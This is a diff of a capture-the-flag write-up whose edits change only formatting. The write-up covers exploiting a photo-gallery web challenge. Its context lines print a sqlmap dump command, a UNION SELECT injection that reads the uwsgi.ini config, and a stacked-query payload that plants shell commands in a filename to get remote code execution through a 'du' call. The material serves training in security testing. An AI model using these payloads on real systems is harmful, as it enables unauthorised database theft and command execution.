@@ -7,7 +7,7 @@ For the first, we, as usual, explore source code of a page and requests. There w
 ```html
 https://target.com/fetch?id=1
 ```
-After some tests on sql-injection, we found that the target has 'blind sql-injection'. Let’s use 'sqlmap' and recover the structure of the database.
+After some tests on sql-injection, we found that the target has `blind sql-injection`. Let’s use 'sqlmap' and recover the structure of the database.
 
 ```bash
 > sqlmap -u “https://target.com/fetch?id=1” -p id –batch –risk 3 – dump
@@ -31,9 +31,9 @@ Consider how you might build this system yourself. What would the query for fetc
 Take a few minutes to consider the state of the union
 This application runs on the uwsgi-nginx-flask-docker image
 ```
-First, what we need to do it’s find out when an 'AND' statement passes and vice versa. 
-I will use 'id=0' for negative and 'id=1' for positive scenarios.
-Second, we need to research the 'uwsgi-nginx-flask-docker' branch on github, for example, to understand what we can use with 'UNION' like a payload.
+First, what we need to do it’s find out when an `AND` statement passes and vice versa. 
+I will use `id=0` for negative and `id=1` for positive scenarios.
+Second, we need to research the `uwsgi-nginx-flask-docker` branch on github, for example, to understand what we can use with `UNION` like a payload.
 
 ```html
 https://target.com/fetch?id=0 UNION SELECT ‘uwsgi.ini’
@@ -58,13 +58,13 @@ That method of finding the size of an album seems suspicious
 Stacked queries rarely work. But when they do, make absolutely sure that you're committed
 Be aware of your environment
 ```
-With that knowledge and the previous results contained in the 'main.py' we can pay attention on this:
+With that knowledge and the previous results contained in the `main.py` we can pay attention on this:
 
 ```html
  'Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT)...
 ```
 
-We can try to realize 'RCE(Remote Code Execution)'.
+We can try to realize _RCE(Remote Code Execution)_.
 
 ```html
 https://target.com/fetch?id=1;update photos set filename=’* || ls -a > test’ where id=3;commit;--
